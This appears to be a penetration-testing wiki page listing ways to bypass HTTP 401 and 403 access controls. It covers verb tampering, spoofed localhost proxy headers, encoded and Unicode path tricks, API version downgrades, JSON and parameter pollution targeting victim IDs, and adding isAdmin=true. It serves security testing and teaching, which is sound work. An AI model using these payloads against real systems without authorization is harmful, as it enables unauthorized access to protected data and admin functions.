# Bypass 401 & 403

In web pentesting, bypassing 401 (_Unauthorized_) and 403 (_Forbidden_) errors helps assess security gaps in access controls. Techniques like **HTTP verb tampering, HTTP header fuzzing** or **Path Fuzzing** are commonly used to find vulnerabilities and gain unauthorized access.

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption><p>Bypass 401 &#x26; 403</p></figcaption></figure>

## [HTTP Verbs Tampering](https://book.bugbountyhub.xyz/pentesting-web/http-verb-tampering)

Try using **different verbs** to access the file: `GET, HEAD, POST, PUT, DELETE, CONNECT, OPTIONS, TRACE, PATCH, INVENTED, HACK`

## HTTP Headers Fuzzing

Try using HTTP Proxy **Headers**, HTTP Authentication Basic and NTLM brute-force (with a few combinations only) and other techniques.

```http
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded: 127.0.0.1
Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
X-Original-URL: 127.0.0.1
Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
Host: localhost
```

If the **path is protected** you can try to bypass the path protection using these other headers:

```http
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

## Path **Fuzzing**

If `/admin` is **blocked**:

* Try using `/%2e/admin` _(if access is blocked by a proxy, this could bypass the protection)._
* _Try also `/%252e/admin`_ (double URL encode)
* Try **Unicode bypass**: `/%ef%bc%8fadmin` (The URL encoded chars are like "/") so when encoded back it will be `//admin` and maybe you will have already bypassed the `/admin` name check

Other `/admin` bypasses:

* `site.com/admin` –> HTTP 403 Forbidden
* `site.com/ADMIN` –> HTTP 200 OK
* `site.com/admin/` –> HTTP 200 OK
* `site.com/admin/.` –> HTTP 200 OK
* `site.com//admin//` –> HTTP 200 OK
* `site.com/./admin/..` –> HTTP 200 OK
* `site.com/;/admin` –> HTTP 200 OK
* `site.com/.;/admin` –> HTTP 200 OK
* `site.com//;//admin` –> HTTP 200 OK
* `site.com/admin.json` –> HTTP 200 OK (_ruby_)

Use all [**this list**](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Unicode.txt) in the following situations:

* `/FUZZsecret`
* `/FUZZ/secret`
* `/secretFUZZ`

Some API bypasses:

* `/v3/users_data/1234` –> 403 Forbidden
* `/v1/users_data/1234` –> 200 OK
* `{“id”:111}`-> 401 Unauthriozied
* `{“id”:[111]}`-> 200 OK
* `{“id”:111}`-> 401 Unauthriozied
* `{“id”:{“id”:111}}` -> 200 OK
* `{"user_id":"<legit_id>","user_id":"<victims_id>"}` (_JSON Parameter Pollution_)
* `user_id=ATTACKER_ID&user_id=VICTIM_ID` (_Parameter Pollution_)

## **Parameter Manipulation** <a href="#parameter-manipulation" id="parameter-manipulation"></a>

* Change **param value**: From **`id=123` --> `id=124`**
* Add additional parameters to the URL: `?`**`id=124` —-> `id=124&isAdmin=true`**
* Remove the parameters
* Re-order parameters
* Use special characters
* Perform boundary testing in the parameters — provide values like _-234_ or _0_ or _99999999_

## **Protocol version** <a href="#protocol-version" id="protocol-version"></a>

If using `HTTP/1.1` **try to use 1.0** or even test if it **supports 2.0**.
